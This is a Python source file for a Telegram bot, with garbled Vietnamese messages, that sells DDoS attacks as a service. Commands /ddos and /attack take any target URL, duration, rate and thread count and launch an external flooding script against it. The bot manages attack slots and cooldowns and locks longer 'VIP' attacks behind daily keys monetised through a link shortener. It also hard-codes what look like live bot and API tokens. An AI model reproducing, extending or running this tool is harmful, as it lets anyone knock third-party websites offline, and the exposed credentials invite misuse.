
import telebot
import random
import datetime
import time
import os, sys, re
import subprocess
import requests
import schedule
from concurrent.futures import ThreadPoolExecutor
import pytz
import threading

# --- C·∫§U H√åNH C∆† B·∫¢N C·ª¶A BOT ---
threading_pool = ThreadPoolExecutor(max_workers=int(100000))
bot_token = '7674870566:AAFFpTcMfzMatLyyAvgjpVngJmpfuw5e8MA' 
bot = telebot.TeleBot(bot_token)
processes = {}
chan_spam = {}
running_attacks = {}  # Theo d√µi c√°c cu·ªôc t·∫•n c√¥ng ƒëang ch·∫°y
attack_slots = {"normal": 0, "vip": 0}  # Theo d√µi slot

# --- C·∫§U H√åNH C·ª¶A NG∆Ø·ªúI D√ôNG ---
ADMIN_ID = '6684542694'
ID_GROUP = '1002812130386' # ID Nh√≥m kh√¥ng c√≥ d·∫•u g·∫°ch n·ªëi
link_gr = "https://t.me/smsjoonwuy"
web_key_base_url = "https://sublikevip.site/index.html?key=" # URL g·ªëc c·ªßa trang ch·ª©a key
user_bot = "@ddos_attack_bot"
admin_user = "@joonwuy"
zalo = "https://zalo.me/g/dqacsy523"
delay_normal = 60  # Delay cho l·ªánh normal
delay_vip = 120    # Delay cho l·ªánh vip
MAX_SLOTS = 2      # T·ªïng s·ªë slot t·ªëi ƒëa

def get_shortened_link(url: str):
    try:
        token = "703371951353e080dde13a50207e2ff7c3fc31fe88f765c17fa11d9fd1046528"
        api_url = f"https://yeumoney.com/QL_api.php?token={token}&format=json&url={url}"
        response = requests.get(api_url, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"L·ªói v·ªõi API r√∫t g·ªçn link: {e}")
        return {"status": "error", "message": f"L·ªói M·∫°ng: {e}"}

def getvideo():
    """L·∫•y m·ªôt URL video ng·∫´u nhi√™n t·ª´ danh s√°ch JSON."""
    try:
        video_list_url = "https://raw.githubusercontent.com/nguyenductai206/list/refs/heads/main/listvideo.json"
        return random.choice(requests.get(video_list_url).json())
    except Exception as e:
        print(f"Kh√¥ng th·ªÉ l·∫•y video: {e}")
        return None

def xoatn(message, dl): 
    """X√≥a m·ªôt tin nh·∫Øn sau m·ªôt kho·∫£ng th·ªùi gian ch·ªù ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh."""
    time.sleep(dl)
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except Exception as e:
        print(f"Kh√¥ng th·ªÉ x√≥a tin nh·∫Øn: {e}")

def getfullname(message):
    """L·∫•y h·ªç v√† t√™n ƒë·∫ßy ƒë·ªß c·ªßa ng∆∞·ªùi d√πng."""
    try:
        full_name = f"{message.from_user.first_name} {message.from_user.last_name}".strip()
        return full_name if full_name else "Ch∆∞a x√°c ƒë·ªãnh"
    except:
        return "Ch∆∞a x√°c ƒë·ªãnh"

def checkgroup(message):
    """Ki·ªÉm tra xem tin nh·∫Øn c√≥ ƒë·∫øn t·ª´ supergroup ƒë∆∞·ª£c cho ph√©p hay kh√¥ng."""
    if message.chat.type == "supergroup" and message.chat.id == -int(ID_GROUP):
        return True
    else:
        full_name = getfullname(message)
        bot.send_message(
            message.chat.id, 
            f"<b>üó∫Ô∏è Ch√†o m·ª´ng {full_name} ƒë·∫øn v·ªõi bot DDoS attack tr√™n telegram !\nVui l√≤ng s·ª≠ d·ª•ng bot trong nh√≥m ch√≠nh th·ª©c.\n<blockquote>Link: {link_gr}</blockquote></b>", 
            parse_mode='HTML'
        )
        return False

def get_current_vietnam_time():
    """L·∫•y th·ªùi gian hi·ªán t·∫°i theo m√∫i gi·ªù Vi·ªát Nam."""
    vietnam_tz = pytz.timezone('Asia/Ho_Chi_Minh')
    return datetime.datetime.now(vietnam_tz)

def get_current_vietnam_date():
    """L·∫•y ng√†y hi·ªán t·∫°i theo m√∫i gi·ªù Vi·ªát Nam."""
    return get_current_vietnam_time().date()

def get_vietnam_day_of_month():
    """L·∫•y ng√†y trong th√°ng theo m√∫i gi·ªù Vi·ªát Nam."""
    return get_current_vietnam_date().day

def TimeStamp():
    """Tr·∫£ v·ªÅ ng√†y hi·ªán t·∫°i theo m√∫i gi·ªù Vi·ªát Nam."""
    vietnam_tz = pytz.timezone('Asia/Ho_Chi_Minh')
    now = datetime.datetime.now(vietnam_tz)
    return now.strftime("%d/%m/%Y")

def get_total_slots():
    """T√≠nh t·ªïng s·ªë slot ƒëang s·ª≠ d·ª•ng."""
    return len(running_attacks)

def validate_url(url):
    """Ki·ªÉm tra URL c√≥ h·ª£p l·ªá kh√¥ng."""
    url_pattern = re.compile(
        r'^https?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return url_pattern.match(url) is not None

def run_ddos_attack(user_id, website, time_sec, rate, thread, attack_type):
    """Ch·∫°y cu·ªôc t·∫•n c√¥ng DDoS v√† qu·∫£n l√Ω slot."""
    attack_id = f"{user_id}_{website}_{int(time.time())}"
    
    try:
        # Ch·∫°y l·ªánh DDoS
        process = subprocess.Popen([
            "python", "main.py", website, str(time_sec), str(rate), str(thread)
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        running_attacks[attack_id] = {
            "process": process,
            "type": attack_type,
            "start_time": time.time(),
            "duration": time_sec
        }
        
        # Ch·ªù process k·∫øt th√∫c ho·∫∑c timeout
        process.wait(timeout=time_sec + 10)
        
    except subprocess.TimeoutExpired:
        # N·∫øu timeout, kill process
        process.kill()
        process.wait()
    except Exception as e:
        print(f"L·ªói khi ch·∫°y DDoS: {e}")
    finally:
        # Gi·∫£i ph√≥ng slot
        if attack_id in running_attacks:
            del running_attacks[attack_id]

# --- C√ÅC H√ÄM X·ª¨ L√ù L·ªÜNH C·ª¶A BOT ---

@bot.message_handler(commands=['start'])
def start(message):
    """X·ª≠ l√Ω l·ªánh /start, h∆∞·ªõng d·∫´n ng∆∞·ªùi d√πng v√†o nh√≥m."""
    if message.chat.type == "private":
        full_name = getfullname(message)
        bot.send_message(
            message.chat.id, 
            f"<b>üó∫Ô∏è Ch√†o m·ª´ng {full_name} ƒë·∫øn v·ªõi bot DDoS attack tr√™n telegram !\nNh·∫•p v√†o link b√™n d∆∞·ªõi ƒë·ªÉ chuy·ªÉn sang nh√≥m\n<blockquote>Link: {link_gr}</blockquote></b>", 
            parse_mode='HTML'
        )

@bot.message_handler(commands=['getkey'])
def startkey(message):
    """T·∫°o v√† cung c·∫•p m·ªôt li√™n k·∫øt r√∫t g·ªçn ƒë·ªÉ ng∆∞·ªùi d√πng l·∫•y key h√†ng ng√†y."""
    if not checkgroup(message): return

    msg = bot.reply_to(message, text='‚è≥ ƒêang t·∫°o link c·ªßa b·∫°n, vui l√≤ng ch·ªù...')

    user_id = message.from_user.id
    day_of_month = get_vietnam_day_of_month()
    key = f"ddos{user_id * day_of_month - 126 * day_of_month}"

    original_url = web_key_base_url + key
    shorten_response = get_shortened_link(original_url)

    if shorten_response.get('status') == 'success':
        link_to_show = shorten_response.get('shortenedUrl', original_url)
        text = f'''
- LINK L·∫§Y KEY NG√ÄY <i>{TimeStamp()}</i> C·ª¶A B·∫†N L√Ä: {link_to_show} -
- V∆Ø·ª¢T CAPTCHA ƒê·ªÇ L·∫§Y KEY -
- KHI C√ì KEY, D√ôNG L·ªÜNH /key &lt;key&gt; ƒê·ªÇ TI·∫æP T·ª§C -
        '''
        bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode="HTML")
    else:
        error_msg = shorten_response.get('message', 'L·ªói kh√¥ng x√°c ƒë·ªãnh.')
        bot.edit_message_text(f"‚ùå **L·ªói khi t·∫°o link:** {error_msg}\nVui l√≤ng th·ª≠ l·∫°i sau.", chat_id=msg.chat.id, message_id=msg.message_id)

@bot.message_handler(commands=['key'])
def key(message):
    """Cho ph√©p ng∆∞·ªùi d√πng nh·∫≠p key ƒë·ªÉ m·ªü kh√≥a l·ªánh /attack."""
    if not checkgroup(message): return

    if len(message.text.split()) == 1:
        bot.reply_to(message, '<strong>VUI L√íNG NH·∫¨P KEY.</strong>\nV√≠ d·ª•: /key abc1234', parse_mode="HTML")
        return

    user_id = message.from_user.id
    submitted_key = message.text.split()[1]
    day_of_month = get_vietnam_day_of_month()

    expected_key = f"ddos{user_id * day_of_month - 126 * day_of_month}"

    if submitted_key == expected_key:
        key_dir = os.path.join(os.getcwd(), "user", str(day_of_month))
        os.makedirs(key_dir, exist_ok=True)
        with open(os.path.join(key_dir, f"{user_id}.txt"), "w") as f:
            f.write("")

        bot.reply_to(message, '‚úÖ KEY H·ª¢P L·ªÜ. B·∫°n ƒë√£ ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh /attack.')
    else:
        bot.reply_to(message, '‚ùå KEY KH√îNG ƒê√öNG. Vui l√≤ng d√πng /getkey ƒë·ªÉ l·∫•y key ch√≠nh x√°c cho h√¥m nay.')

@bot.message_handler(commands=['ddos'])
def ddos_normal(message):
    """X·ª≠ l√Ω l·ªánh DDoS th∆∞·ªùng (gi·ªõi h·∫°n 30 gi√¢y)."""
    if not checkgroup(message): return

    user_id = str(message.from_user.id)

    # Ki·ªÉm tra slot
    if get_total_slots() >= MAX_SLOTS:
        bot.reply_to(message, f'‚ùå ƒê√£ h·∫øt slot! Hi·ªán t·∫°i ƒëang c√≥ {get_total_slots()}/{MAX_SLOTS} cu·ªôc t·∫•n c√¥ng ƒëang ch·∫°y. Vui l√≤ng ch·ªù.')
        return

    # X√°c th·ª±c c√°c tham s·ªë c·ªßa l·ªánh
    args = message.text.split()
    if len(args) < 5:
        bot.reply_to(message, 'Sai ƒë·ªãnh d·∫°ng l·ªánh. D√πng: /ddos <website> <time> <rate> <thread>')
        return

    website, time_input, rate, thread = args[1], args[2], args[3], args[4]

    # Validate parameters
    if not validate_url(website):
        bot.reply_to(message, '‚ùå URL kh√¥ng h·ª£p l·ªá!')
        return

    try:
        time_sec = int(time_input)
        rate_val = int(rate)
        thread_val = int(thread)
    except ValueError:
        bot.reply_to(message, '‚ùå C√°c tham s·ªë ph·∫£i l√† s·ªë!')
        return

    if not (1 <= time_sec <= 30):
        bot.reply_to(message, "‚ùå Th·ªùi gian ph·∫£i t·ª´ 1 ƒë·∫øn 30 gi√¢y cho l·ªánh th∆∞·ªùng.")
        return

    if not (1 <= rate_val <= 100):
        bot.reply_to(message, "‚ùå Rate ph·∫£i t·ª´ 1 ƒë·∫øn 100.")
        return

    if not (1 <= thread_val <= 100):
        bot.reply_to(message, "‚ùå Thread ph·∫£i t·ª´ 1 ƒë·∫øn 100.")
        return

    # Ki·ªÉm tra th·ªùi gian ch·ªù
    if user_id in chan_spam:
        elapsed = int(time.time() - chan_spam[user_id])
        if elapsed <= delay_normal:
            bot.reply_to(message, f"Vui l√≤ng ch·ªù th√™m {delay_normal - elapsed} gi√¢y tr∆∞·ªõc l·∫ßn t·∫•n c√¥ng ti·∫øp theo.")
            return

    # B·∫Øt ƒë·∫ßu t·∫•n c√¥ng
    chan_spam[user_id] = time.time()

    current_time = get_current_vietnam_time().strftime("%H:%M:%S %d/%m/%Y")
    text = f'<strong>üöÄ B·∫Øt ƒê·∫ßu T·∫•n C√¥ng DDoS Cho {getfullname(message)} üöÄ</strong>\n<blockquote>‚îå Bot üëæ: {user_bot} \n‚îú Target üéØ: {website}\n‚îú Th·ªùi gian: {time_sec}s\n‚îú Rate: {rate_val}\n‚îú Thread: {thread_val}\n‚îú Th·ªùi ƒëi·ªÉm: {current_time}\n‚îú Ch·ªß s·ªü h·ªØu üëë: {admin_user}\n‚îî Lo·∫°i: Normal</blockquote>'

    # Ch·∫°y t·∫•n c√¥ng trong thread ri√™ng
    threading_pool.submit(run_ddos_attack, user_id, website, time_sec, rate_val, thread_val, "normal")

    xoatn(message, 2)
    bot.send_video(message.chat.id, video=getvideo(), caption=text, supports_streaming=True, parse_mode='HTML')

@bot.message_handler(commands=['attack'])
def ddos_vip(message):
    """X·ª≠ l√Ω l·ªánh DDoS VIP (gi·ªõi h·∫°n 300 gi√¢y)."""
    if not checkgroup(message): return

    user_id = str(message.from_user.id)
    day_of_month = str(get_vietnam_day_of_month())

    # Ki·ªÉm tra key
    if not os.path.exists(f"./user/{day_of_month}/{user_id}.txt"):
        bot.reply_to(message, 'B·∫°n c·∫ßn c√≥ key cho h√¥m nay. D√πng /getkey v√† sau ƒë√≥ /key ƒë·ªÉ nh·∫≠p key.')
        return

    # Ki·ªÉm tra slot
    if get_total_slots() >= MAX_SLOTS:
        bot.reply_to(message, f'‚ùå ƒê√£ h·∫øt slot! Hi·ªán t·∫°i ƒëang c√≥ {get_total_slots()}/{MAX_SLOTS} cu·ªôc t·∫•n c√¥ng ƒëang ch·∫°y. Vui l√≤ng ch·ªù.')
        return

    # X√°c th·ª±c c√°c tham s·ªë c·ªßa l·ªánh
    args = message.text.split()
    if len(args) < 5:
        bot.reply_to(message, 'Sai ƒë·ªãnh d·∫°ng l·ªánh. D√πng: /attack <website> <time> <rate> <thread>')
        return

    website, time_input, rate, thread = args[1], args[2], args[3], args[4]

    # Validate parameters
    if not validate_url(website):
        bot.reply_to(message, '‚ùå URL kh√¥ng h·ª£p l·ªá!')
        return

    try:
        time_sec = int(time_input)
        rate_val = int(rate)
        thread_val = int(thread)
    except ValueError:
        bot.reply_to(message, '‚ùå C√°c tham s·ªë ph·∫£i l√† s·ªë!')
        return

    if not (1 <= time_sec <= 300):
        bot.reply_to(message, "‚ùå Th·ªùi gian ph·∫£i t·ª´ 1 ƒë·∫øn 300 gi√¢y cho l·ªánh VIP.")
        return

    if not (1 <= rate_val <= 200):
        bot.reply_to(message, "‚ùå Rate ph·∫£i t·ª´ 1 ƒë·∫øn 200.")
        return

    if not (1 <= thread_val <= 200):
        bot.reply_to(message, "‚ùå Thread ph·∫£i t·ª´ 1 ƒë·∫øn 200.")
        return

    # Ki·ªÉm tra th·ªùi gian ch·ªù VIP
    if user_id in chan_spam:
        elapsed = int(time.time() - chan_spam[user_id])
        if elapsed <= delay_vip:
            bot.reply_to(message, f"Vui l√≤ng ch·ªù th√™m {delay_vip - elapsed} gi√¢y tr∆∞·ªõc l·∫ßn t·∫•n c√¥ng ti·∫øp theo.")
            return

    # B·∫Øt ƒë·∫ßu t·∫•n c√¥ng VIP
    chan_spam[user_id] = time.time()

    current_time = get_current_vietnam_time().strftime("%H:%M:%S %d/%m/%Y")
    text = f'<strong>üöÄ B·∫Øt ƒê·∫ßu T·∫•n C√¥ng DDoS VIP Cho {getfullname(message)} üöÄ</strong>\n<blockquote>‚îå Bot üëæ: {user_bot} \n‚îú Target üéØ: {website}\n‚îú Th·ªùi gian: {time_sec}s\n‚îú Rate: {rate_val}\n‚îú Thread: {thread_val}\n‚îú Th·ªùi ƒëi·ªÉm: {current_time}\n‚îú Ch·ªß s·ªü h·ªØu üëë: {admin_user}\n‚îî Lo·∫°i: VIP</blockquote>'

    # Ch·∫°y t·∫•n c√¥ng trong thread ri√™ng
    threading_pool.submit(run_ddos_attack, user_id, website, time_sec, rate_val, thread_val, "vip")

    xoatn(message, 2)
    bot.send_video(message.chat.id, video=getvideo(), caption=text, supports_streaming=True, parse_mode='HTML')

@bot.message_handler(commands=['status'])
def status(message):
    """Hi·ªÉn th·ªã tr·∫°ng th√°i slot v√† c√°c cu·ªôc t·∫•n c√¥ng ƒëang ch·∫°y."""
    if not checkgroup(message): return

    total_slots = get_total_slots()
    status_text = f"üìä **Tr·∫°ng th√°i h·ªá th·ªëng:**\n"
    status_text += f"üéØ Slot ƒëang s·ª≠ d·ª•ng: {total_slots}/{MAX_SLOTS}\n\n"

    if running_attacks:
        status_text += "üî• **C√°c cu·ªôc t·∫•n c√¥ng ƒëang ch·∫°y:**\n"
        for attack_id, attack_info in running_attacks.items():
            elapsed = int(time.time() - attack_info['start_time'])
            remaining = max(0, attack_info['duration'] - elapsed)
            status_text += f"‚Ä¢ Lo·∫°i: {attack_info['type'].upper()} | C√≤n l·∫°i: {remaining}s\n"
    else:
        status_text += "‚úÖ Kh√¥ng c√≥ cu·ªôc t·∫•n c√¥ng n√†o ƒëang ch·∫°y."

    bot.reply_to(message, status_text, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help(message):
    if not checkgroup(message): return
    text = f"""
<b>Ch√†o m·ª´ng ƒë·∫øn v·ªõi <i>bot DDoS c·ªßa t√¥i!</i></b>
<u>C√°c l·ªánh c·ªßa bot:</u>
  <code>/help</code> - Xem c√°c l·ªánh.
  <code>/getkey</code> - L·∫•y key h√†ng ng√†y (cho l·ªánh VIP).
  <code>/key &lt;key&gt;</code> - Nh·∫≠p key ƒë·ªÉ m·ªü kh√≥a l·ªánh VIP.
  <code>/ddos &lt;website&gt; &lt;time&gt; &lt;rate&gt; &lt;thread&gt;</code> - T·∫•n c√¥ng DDoS th∆∞·ªùng (max 30s).
  <code>/attack &lt;website&gt; &lt;time&gt; &lt;rate&gt; &lt;thread&gt;</code> - T·∫•n c√¥ng DDoS VIP (max 300s).
  <code>/status</code> - Xem tr·∫°ng th√°i slot v√† cu·ªôc t·∫•n c√¥ng.
  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
  üìù <b>L∆∞u √Ω:</b>
  ‚Ä¢ Ch·ªâ ƒë∆∞·ª£c ch·∫°y t·ªëi ƒëa {MAX_SLOTS} cu·ªôc t·∫•n c√¥ng c√πng l√∫c
  ‚Ä¢ L·ªánh /ddos: gi·ªõi h·∫°n 30 gi√¢y, delay {delay_normal}s
  ‚Ä¢ L·ªánh /attack: gi·ªõi h·∫°n 300 gi√¢y, delay {delay_vip}s, c·∫ßn key
  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
  <a href="{zalo}">B·∫•m v√†o ƒë√¢y ƒë·ªÉ tham gia nh√≥m Zalo.</a>
    """
    bot.send_message(message.chat.id, text, parse_mode="HTML")

# --- B·∫ÆT ƒê·∫¶U CH·∫†Y BOT ---
print("DDoS Bot ƒëang ch·∫°y...")
bot.infinity_polling()
